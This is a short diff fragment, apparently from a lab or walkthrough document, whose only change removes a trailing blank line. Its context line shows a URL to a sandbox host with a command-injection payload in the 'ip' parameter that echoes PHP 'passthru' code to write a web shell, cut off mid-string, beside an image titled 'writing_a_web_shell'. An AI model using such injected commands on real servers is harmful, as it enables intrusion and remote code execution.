@@ -301,4 +301,3 @@ http://ci-sandbox:80/php/index.php?ip=127.0.0.1;echo+%22%3Cpre%3E%3C?php+passthr
 ![writing_a_web_shell](images/writing_a_web_shell.png)
 
 
-
